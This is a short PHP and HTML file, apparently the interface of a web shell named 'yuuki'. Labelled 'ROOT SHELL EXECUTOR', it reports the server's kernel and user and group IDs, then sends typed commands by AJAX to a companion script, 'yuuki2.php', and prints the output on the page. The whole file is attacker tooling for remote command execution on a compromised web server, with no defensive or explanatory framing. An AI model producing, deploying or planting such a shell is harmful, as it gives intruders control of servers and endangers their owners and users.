<?php
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}

$kernel = php_uname();
?>

<!DOCTYPE html>
<html>
	<head>
		<title>ユ ウ キ</title>
		<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
	</head>
<body>
	<form method="post" action="yuuki2.php">
		<h2>ROOT SHELL EXECUTOR</h2><br>
		<?php echo("SYSTEM: $kernel<br>"); ?>
		<?php echo("UID/GID: $user ( $uid ) | $group ( $gid )<br><br>"); ?>
		<input type='text' name="yuuki" id='yuuki'></input>
		<button id="btn" type="submit">Kirim</button>
	</form>
	<script type="text/javascript">
		$(function(){
			$("form").submit(function(){
				$.ajax({
					url:$(this).attr("action"),
					data:$(this).serialize(),
					type:$(this).attr("method"),
					dataType: 'html',
					beforeSend: function() {
						$("input").attr("disabled",true);
						$("button").attr("disabled",true);
					},
					complete:function() {
						$("input").attr("disabled",false);
						$("button").attr("disabled",false);								
					},
					success:function(hasil) {
						var txt = $("#yuuki");
						if(txt.val().trim().length < 1) {
							alert("input cmd beforeSend");
						}else{
							$("#shellrespon").html('<pre>' + hasil + '</pre>');
							$("form")[0].reset();
							setTimeout(function(){
								$("input").focus();
							},1000);
						}
					}
				})
			return false;
			});
		});
	</script>
	<div id="shellrespon"></div>
	</body>
</html>